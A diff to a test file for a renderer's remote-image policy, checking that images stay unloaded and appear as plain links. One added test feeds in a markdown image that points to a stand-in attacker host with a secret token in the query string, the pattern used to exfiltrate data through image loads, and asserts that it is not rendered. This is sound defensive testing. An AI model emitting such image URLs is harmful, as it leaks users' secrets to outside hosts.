@@ -109,13 +109,16 @@ describe("images", () => {
     const html = block(IMG);
     expect(html).not.toContain("<img");
     expect(html).toContain("Load image: A cat");
-    expect(html).toContain("example.com");
+    expect(html).toContain("https://example.com/cat.png");
   });
 
   it("never loads under the never policy, in markdown too", () => {
     applyWorkspaceIdentity({ name: "w", telemetry: false, remote_images: "never" });
     expect(block(IMG)).not.toContain("<img");
-    expect(md("![A cat](https://example.com/cat.png)")).not.toContain("<img");
+    expect(block(IMG)).toContain("https://example.com/cat.png");
+    const leak = md("![A cat](https://evil.example/p.png?d=secret-token)");
+    expect(leak).not.toContain("<img");
+    expect(leak).toContain("https://evil.example/p.png?d=secret-token");
   });
 
   it("always shows inline images", () => {
